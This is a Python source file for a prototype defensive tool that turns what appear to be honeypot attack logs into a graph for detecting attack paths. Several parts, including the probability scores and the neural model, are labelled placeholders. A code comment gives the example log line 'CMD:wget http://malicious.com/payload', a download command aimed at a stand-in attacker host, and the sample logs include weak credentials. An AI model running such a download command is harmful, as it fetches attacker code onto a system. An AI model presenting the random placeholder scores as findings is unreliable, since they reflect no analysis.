import torch
from torch_geometric.data import Data
from collections import defaultdict
import re
import datetime
import random # Import random

# Define node types and their integer mappings
NODE_TYPE_MAP = {
    "IP": 0,
    "PORT": 1,
    "EVENT_TYPE": 2,
    "USERNAME": 3,
    "PASSWORD": 4,
    "COMMAND": 5,
    "FILE": 6,
    "PROTOCOL": 7, # e.g., SSH, FTP
    "UNKNOWN": 8,
}

# Reverse map for debugging
REV_NODE_TYPE_MAP = {v: k for k, v in NODE_TYPE_MAP.items()}

class CyberGraph:
    def __init__(self):
        self.nodes = {} # Maps entity string to (node_id, node_type_int)
        self.node_features = [] # List of node feature vectors (e.g., one-hot for type)
        self.edges = defaultdict(list) # Adjacency list for edges (node_id -> [neighbor_node_id, edge_type_int])
        self.edge_features = [] # List of edge feature vectors (e.g., one-hot for type)
        self.next_node_id = 0

        # Define edge types and their integer mappings
        self.EDGE_TYPE_MAP = {
            "CONNECTS_TO": 0,
            "ATTACKS_ON": 1,
            "USES": 2,
            "HAS_USERNAME": 3,
            "HAS_PASSWORD": 4,
            "EXECUTES": 5,
            "TRANSFERS": 6,
            "OBSERVED_AT": 7, # Event observed at a timestamp
            "UNKNOWN_RELATION": 8,
        }
        self.REV_EDGE_TYPE_MAP = {v: k for k, v in self.EDGE_TYPE_MAP.items()}

    def _add_node(self, entity_str, node_type_str):
        if entity_str not in self.nodes:
            node_id = self.next_node_id
            self.nodes[entity_str] = (node_id, NODE_TYPE_MAP.get(node_type_str, NODE_TYPE_MAP["UNKNOWN"]))
            # For simplicity, node features are just one-hot encoding of node type
            feature_vector = [0] * len(NODE_TYPE_MAP)
            feature_vector[NODE_TYPE_MAP.get(node_type_str, NODE_TYPE_MAP["UNKNOWN"])] = 1
            self.node_features.append(feature_vector)
            self.next_node_id += 1
        return self.nodes[entity_str][0] # Return node_id

    def _add_edge(self, node1_id, node2_id, edge_type_str):
        edge_type_int = self.EDGE_TYPE_MAP.get(edge_type_str, self.EDGE_TYPE_MAP["UNKNOWN_RELATION"])
        self.edges[node1_id].append((node2_id, edge_type_int))
        # For simplicity, edge features are just one-hot encoding of edge type
        feature_vector = [0] * len(self.EDGE_TYPE_MAP)
        feature_vector[edge_type_int] = 1
        self.edge_features.append(feature_vector)

    def build_graph_from_logs(self, attack_logs):
        for log_entry in attack_logs:
            # Extract entities from log_entry
            ip_addr = log_entry.ip
            port = str(log_entry.port)
            log_data = log_entry.data
            timestamp = log_entry.timestamp # datetime object

            # Add IP node
            ip_node_id = self._add_node(ip_addr, "IP")
            # Add Port node
            port_node_id = self._add_node(port, "PORT")

            # IP connects to Port
            self._add_edge(ip_node_id, port_node_id, "CONNECTS_TO")

            # Parse log_data for more entities and relationships
            # Example: "SSH login attempt: user=root, password=password123"
            if "SSH login attempt" in log_data:
                event_node_id = self._add_node("SSH_LOGIN_ATTEMPT", "EVENT_TYPE")
                self._add_edge(ip_node_id, event_node_id, "ATTACKS_ON")
                self._add_edge(event_node_id, port_node_id, "USES")
                self._add_edge(event_node_id, self._add_node("SSH", "PROTOCOL"), "USES")

                user_match = re.search(r"user=(\S+)", log_data)
                if user_match:
                    username = user_match.group(1)
                    user_node_id = self._add_node(username, "USERNAME")
                    self._add_edge(event_node_id, user_node_id, "HAS_USERNAME")

                pass_match = re.search(r"password=(\S+)", log_data)
                if pass_match:
                    password = pass_match.group(1)
                    pass_node_id = self._add_node(password, "PASSWORD")
                    self._add_edge(event_node_id, pass_node_id, "HAS_PASSWORD")
            
            # Example: "CMD:wget http://malicious.com/payload"
            if "CMD:" in log_data:
                cmd_match = re.search(r"CMD:(\S+)", log_data)
                if cmd_match:
                    command = cmd_match.group(1)
                    cmd_node_id = self._add_node(command, "COMMAND")
                    event_node_id = self._add_node("COMMAND_EXECUTION", "EVENT_TYPE")
                    self._add_edge(ip_node_id, event_node_id, "ATTACKS_ON")
                    self._add_edge(event_node_id, cmd_node_id, "EXECUTES")

            # Add more parsing logic for other event types (SCAN, FILE_UPLOAD, etc.)

        # Convert to PyTorch Geometric Data object
        edge_index = []
        for src, neighbors in self.edges.items():
            for dest, _ in neighbors:
                edge_index.append([src, dest])
        
        if not edge_index:
            return None # No edges, no graph

        x = torch.tensor(self.node_features, dtype=torch.float)
        edge_index = torch.tensor(edge_index, dtype=torch.long).t().contiguous()
        # edge_attr = torch.tensor(self.edge_features, dtype=torch.float) # If we want edge features

        return Data(x=x, edge_index=edge_index)

    def find_attack_paths(self):
        """
        Identifies potential attack paths based on simple heuristics.
        This is a placeholder and would be expanded with more sophisticated graph traversal algorithms.
        """
        attack_paths = []
        # Group events by IP address
        ip_events = defaultdict(list)
        for entity_str, (node_id, node_type_int) in self.nodes.items():
            if node_type_int == NODE_TYPE_MAP["IP"]:
                # Find all events associated with this IP
                for src_node_id, neighbors in self.edges.items():
                    if src_node_id == node_id:
                        for dest_node_id, edge_type_int in neighbors:
                            if edge_type_int == self.EDGE_TYPE_MAP["ATTACKS_ON"]:
                                event_node_str = next(k for k, v in self.nodes.items() if v[0] == dest_node_id)
                                ip_events[entity_str].append(event_node_str)
        
        for ip, events in ip_events.items():
            if len(events) > 1: # Simple heuristic: more than one event from an IP
                attack_paths.append(f"Potential attack path from IP {ip} with events: {', '.join(events)}")
        
        return attack_paths

# Placeholder for Bayesian Network Integration
class BayesianNetworkAnalyzer:
    def __init__(self):
        print("Placeholder for Bayesian Network Analyzer: Needs a library like 'pgmpy' or custom implementation.")

    def assign_probabilities(self, graph_data, attack_paths):
        """
        Assigns probabilities to attack paths using a Bayesian Network.
        This is a placeholder.
        """
        print("Simulating Bayesian Network probability assignment...")
        # In a real implementation, this would involve:
        # 1. Defining the structure of the Bayesian Network (nodes and edges representing dependencies).
        # 2. Learning or defining conditional probability distributions.
        # 3. Performing inference to calculate probabilities of attack paths.
        
        # For now, just return a dummy probability
        return {path: random.uniform(0.5, 0.99) for path in attack_paths}

# Placeholder for GNN Model
class SimpleGNN(torch.nn.Module):
    def __init__(self, num_node_features, hidden_channels, num_classes):
        super().__init__()
        # Example GNN layers (e.g., GCNConv, GraphSAGEConv)
        # from torch_geometric.nn import GCNConv
        # self.conv1 = GCNConv(num_node_features, hidden_channels)
        # self.conv2 = GCNConv(hidden_channels, num_classes)
        print("Placeholder for GNN Model: Needs actual GNN layers from torch_geometric.nn")
        self.linear = torch.nn.Linear(num_node_features, num_classes) # Dummy layer

    def forward(self, data):
        x, edge_index = data.x, data.edge_index
        # x = self.conv1(x, edge_index)
        # x = F.relu(x)
        # x = F.dropout(x, training=self.training)
        # x = self.conv2(x, edge_index)
        return self.linear(x) # Dummy output

# Placeholder for Symbolic Reasoning Engine
class SymbolicReasoningEngine:
    def __init__(self):
        self.rules = []

    def add_rule(self, rule_func):
        self.rules.append(rule_func)

    def analyze_graph(self, graph_data, cyber_graph_instance):
        findings = []
        # Example rule: Detect SSH brute-force
        # This would require more sophisticated graph querying
        # For demonstration, let's assume we can find patterns
        
        # Rule 1: SSH brute-force + privilege escalation
        # IF (SSH login attempt from IP X with multiple failed passwords) AND (subsequent command execution as root from IP X)
        # THEN mark as potential pivot attempt
        
        # This is highly simplified and would require actual graph traversal and pattern matching
        # For now, just a print statement
        print("Symbolic Reasoning Engine: Applying rules to graph data...")
        for rule in self.rules:
            rule_findings = rule(graph_data, cyber_graph_instance)
            if rule_findings:
                findings.extend(rule_findings)
        return findings

# Example Rule Function
def detect_ssh_brute_force_pivot(graph_data, cyber_graph_instance):
    findings = []
    # In a real scenario, you would query the graph for specific patterns
    # e.g., find IP nodes connected to multiple failed SSH login attempts,
    # then check if that IP is also connected to a command execution event with a privileged command.
    
    # For this placeholder, we'll just simulate a finding
    # if "SSH_LOGIN_ATTEMPT" in cyber_graph_instance.nodes and "COMMAND_EXECUTION" in cyber_graph_instance.nodes:
    #     findings.append("Potential SSH brute-force leading to pivot attempt detected.")
    return findings

if __name__ == "__main__":
    # Example Usage (requires AttackLog objects)
    # from backend_api.database import AttackLog
    # log1 = AttackLog(ip="192.168.1.10", port=22, data="SSH login attempt: user=root, password=password123")
    # log2 = AttackLog(ip="192.168.1.10", port=22, data="SSH login attempt: user=admin, password=wrongpass")
    # log3 = AttackLog(ip="192.168.1.10", port=80, data="HTTP GET /index.html")
    # log4 = AttackLog(ip="192.168.1.11", port=22, data="SSH login attempt: user=user, password=correctpass")
    # log5 = AttackLog(ip="192.168.1.10", port=22, data="CMD:sudo apt update")

    # cyber_graph = CyberGraph()
    # graph_data = cyber_graph.build_graph_from_logs([log1, log2, log3, log4, log5])

    # if graph_data:
    #     print("Graph built successfully:")
    #     print(graph_data)
    #     print("Node mapping:", cyber_graph.nodes)
    #     print("Edge mapping:", cyber_graph.edges)

    #     # GNN Model Placeholder
    #     # model = SimpleGNN(num_node_features=len(NODE_TYPE_MAP), hidden_channels=16, num_classes=2)
    #     # output = model(graph_data)
    #     # print("GNN Output (dummy):", output.shape)

    #     # Symbolic Reasoning Engine Placeholder
    #     # sre = SymbolicReasoningEngine()
    #     # sre.add_rule(detect_ssh_brute_force_pivot)
    #     # findings = sre.analyze_graph(graph_data, cyber_graph)
    #     # if findings:
    #     #     print("Findings:", findings)
    #     # else:
    #     #     print("No specific findings from symbolic reasoning.")
    print("Neuro-Symbolic Cyber Reasoning Engine: Placeholder created. Requires actual log data and GNN implementation.")